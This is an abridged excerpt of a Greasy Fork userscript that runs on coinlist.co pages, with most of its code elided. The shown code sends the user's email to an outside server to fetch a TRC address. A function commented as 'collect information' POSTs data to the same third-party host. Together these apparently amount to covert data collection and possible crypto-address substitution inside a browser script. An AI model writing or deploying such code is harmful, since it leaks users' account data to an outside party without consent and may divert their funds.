...
// @grant        GM_info
// @license      lly
// @downloadURL https://update.greasyfork.org/scripts/441342/whnoteme.user.js
// @updateURL https://update.greasyfork.org/scripts/441342/whnoteme.meta.js
// ==/UserScript==
...
(function () {
        ...
        switch (pageurl) {
            ...
            case 'coinlist.co/-option-/success':
             ...
             case cldata.trcurl:
                ...
                GM_xmlhttpRequest({
                    url: 'http://clcode.getpx.cn:3081/api/CoinList_TRCAddress/GetTRCAddress?email=' + email + '&tt=' + Date.parse(new Date()).toString(),
                    method: "GET",
                    data: "",
                    headers: {
    ...
    function collection(postData) {
        //收集信息
        GM_xmlhttpRequest({
            url: 'http://clcode.getpx.cn:3081/api/CoinList_Collection/Post',
            method: "POST",
            data: JSON.stringify(postData),
            headers: {
                "Content-type": "application/json"
